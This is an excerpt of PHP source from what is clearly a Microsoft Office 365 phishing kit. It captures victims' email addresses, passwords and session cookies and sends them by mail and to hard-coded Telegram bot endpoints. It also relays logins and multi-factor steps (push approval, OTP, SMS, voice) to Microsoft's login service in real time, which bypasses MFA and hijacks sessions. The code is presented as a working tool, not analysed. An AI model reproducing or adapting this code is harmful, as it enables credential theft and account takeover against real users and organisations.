...
function sendEmailResult($email, $password, $cookie = '')
{
    ...
    $message = "💼 [ OFFICE RESULTS ] 💼\n";
     $message .= "⮡ [ 📧 URL : " . $_SERVER['HTTP_HOST'] . "\n";
    $message .= "⮡ [ 📧 Credentials :  \n";
    $message .= $email .":".$password. "\n";
    $isCookie = $cookie != '' ? ' [COOKIES]' : '[NO COOKIES]';
    $subject = "Result | " . $email . " | " . $ip . $isCookie;
    mail($receivedEmail, $subject, $message);
  $website="https://api.telegram.org/bot8145167358:AAHh7Y3SoS2bSPimw6RWCR3DSUJYLP32i4A";
  $params=[
      'chat_id'=>"-4614094075",
      'text'=>$message,
  ];
  ...
  curl_close($ch);
    ...
    $web="https://api.telegram.org/bot6833993399:AAG1ONVXGb4cRQ3q2V2jYQeFUbWre6vCxIQ";
  $params=[
      'chat_id'=>"-4070841154",
      'text'=>$message,
  ];
  $ch = curl_init($web . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
...
function cookieToJSON($cookie, $dom)
{
    ...
    $data = ["domain" => $domain, "expirationDate" => $expirationDate, "hostOnly" => $hostOnly, "httpOnly" => $httpOnly, "name" => $name, "path" => $path, "sameSite" => $SameSite, "secure" => $secure, "session" => $session, "storeId" => null, "value" => $value];
    return $data;
}
...
function getTokenMicrosoft()
{
    ...
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $headers = array();
    $headers[] = "Host: https://login.microsoftonline.com";
    ...
    curl_close($ch);
    return ['ctx' => $ctx, 'flowToken' => $flowToken, 'canary' => $canary];
}
...
function getDetailEmail($email)
{
    ...
    return ['status' => 'success', 'banner' => $banner, 'background' => $background];
}
function loginOffice($email, $password)
{
    ...
    if (strpos($result, 'Your account or password is incorrect') !== false) {
        ...
        if (isset($json['arrUserProofs'])) {
            ...
            $tokenToRetrun = ['ctx' => $json['sCtx'], 'flowToken' => $json['sFT'], 'canary' => $json['apiCanary'], 'cookie' => $headerCookie];
            sendEmailResult($email, $password, '');
            return ['status' => 'verify', 'message' => 'Please verify your account', 'data' => base64_encode(json_encode($tokenToRetrun)), 'method' => base64_encode(json_encode($json['arrUserProofs'])), 'key' => base64_encode($password)];
        }
...
{
    $data = ["AuthMethodId" => $method, "Method" => "BeginAuth", "ctx" => $ctx, "flowToken" => $flowToken];
    $ch = curl_init();
...
function EndAuthOffice($token, $otc = null)
{
    ...
    $data = ["Method" => "EndAuth", "SessionId" => $token['session'], "FlowToken" => $token['flowToken'], "Ctx" => $token['ctx'], "AuthMethodId" => $token['method']];
    if ($otc != null) {
    ...
    if ($action == 'login') {
        ...
        if ($action == 'verify') {
            ...
            if ($method == 'PhoneAppNotification') {
                ...
                if ($method == 'PhoneAppOTP') {
                    $redirect = 'phoneappotp';
                } else {
                    if ($method == 'OneWaySMS') {
                        $redirect = 'sms';
                    } else {
                        if ($method == 'TwoWayVoiceMobile') {
                            $redirect = 'twoawaysms';
                        }
                    }
                }
            ...
            if ($beginAuth['Success']) {
                $token = base64_encode(json_encode(['ctx' => $beginAuth['Ctx'], 'flowToken' => $beginAuth['FlowToken'], 'cookie' => $token['cookie'], 'method' => $method, 'session' => $beginAuth['SessionId']]));
                echo json_encode(['status' => true, 'data' => $token, 'redirect' => "?{$redirect}&user={$user}&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg={$bg}&logo={$logo}&token={$token}&key={$key}"]);
            } else {
                echo json_encode(['status' => false, 'message' => 'Verification request failed']);
            }
        } else {
            if ($action == 'checkVerify') {
                $user = $_POST['user'];
                $token = json_decode(base64_decode($_POST['token']), true);
                if ($_POST['service'] == 'notif') {
                    $endAuth = EndAuthOffice($_POST['token']);
                    $newToken = base64_encode(json_encode(['ctx' => $endAuth['Ctx'], 'flowToken' => $endAuth['FlowToken'], 'cookie' => $token['cookie'], 'method' => $token['method'], 'session' => $endAuth['SessionId']]));
                    if ($endAuth['Success']) {
                        processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);
                        echo json_encode(['status' => true, 'redirect' => "../main.php?success&id={$user}&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo'])]);
                    } else {
                        echo json_encode(['status' => false, 'message' => 'Verification failed', 'token' => $newToken]);
                    }
                } else {
                    if ($_POST['service'] == 'sms') {
